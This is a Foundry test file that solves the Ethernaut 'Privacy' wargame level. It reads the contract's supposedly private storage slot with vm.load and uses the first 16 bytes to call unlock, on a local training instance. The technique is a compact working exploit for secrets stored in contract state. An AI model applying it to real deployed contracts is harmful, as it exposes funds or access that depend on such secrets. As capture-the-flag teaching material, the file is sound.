// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Privacy/Privacy.sol";
import "../src/Privacy/PrivacyFactory.sol";
import "../src/Ethernaut.sol";

contract PrivacyTest is Test {
    Ethernaut private _ethernaut;
    PrivacyFactory private _privacyFactory;
    Privacy private _privacy;

    address private _hacker = address(0xA);

    modifier testWrapper() {
        vm.deal(_hacker, 1 ether);
        _ethernaut.registerLevel(_privacyFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance(_privacyFactory);
        _privacy = Privacy(instance);
        _;
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_privacy))
        );
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _privacyFactory = new PrivacyFactory();
    }

    function testPrivacyHack() public testWrapper {
        bytes32 data = vm.load(address(_privacy), bytes32(uint256(5)));
        // console2.logBytes32(data);
        // console2.logBytes16(bytes16(data));
        _privacy.unlock(bytes16(data));
    }
}
